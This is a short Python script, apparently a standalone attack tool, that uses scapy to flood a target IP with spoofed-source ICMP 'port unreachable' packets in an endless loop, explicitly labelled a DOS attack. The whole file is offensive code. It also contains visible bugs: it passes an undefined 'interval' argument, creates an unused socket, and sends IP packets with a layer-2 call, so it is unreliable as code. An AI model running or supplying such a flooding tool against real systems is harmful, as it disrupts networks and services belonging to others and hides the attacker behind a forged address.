#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from time import sleep
from os import geteuid
from sys import argv, exit
from argparse import ArgumentParser

def exploit(source, target, iface="eth0"):
    socket = conf.L2socket(iface=iface)
    packets=[]
    for i in xrange(1,100):
        packets.append(IP(dst=target,src=source)/ICMP(type=3,code=3))

    while True:
        sendp(packets)

if __name__ == "__main__":
    ap = ArgumentParser(description="[+] DOS Attack")
    ap.add_argument("-s", "--source", required=True, help="Spoofed source IP address")
    ap.add_argument("-t", "--target", required=True, help="Target's IP address")
    ap.add_argument("-i", "--interface", required=False, help="Network interface to use")
    args = vars(ap.parse_args())

    if not geteuid() == 0:
        exit("[!] Root you must!")

    try:
        print("[*] Starting attack")
        exploit(args["source"], args["target"], args["interface"], args["interval"])
    except IOError:
        exit("[!] Error sending packets")
    except KeyboardInterrupt:
        print("\n[*] Stopping attack")
